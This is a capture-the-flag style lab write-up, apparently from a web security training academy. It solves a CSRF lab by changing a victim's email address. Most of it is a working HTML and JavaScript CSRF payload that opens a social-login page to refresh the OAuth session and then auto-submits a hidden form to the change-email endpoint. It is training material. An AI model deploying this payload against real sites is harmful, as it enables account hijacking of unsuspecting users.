*This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
The lab supports OAuth-based login. You can log in via your social media account with the following credentials: wiener:peter*

Used the following script to solve the lab:
```html
<form method="POST" action="https://0a78005e0468a23180180d55000d00c8.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://0a78005e0468a23180180d55000d00c8.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```
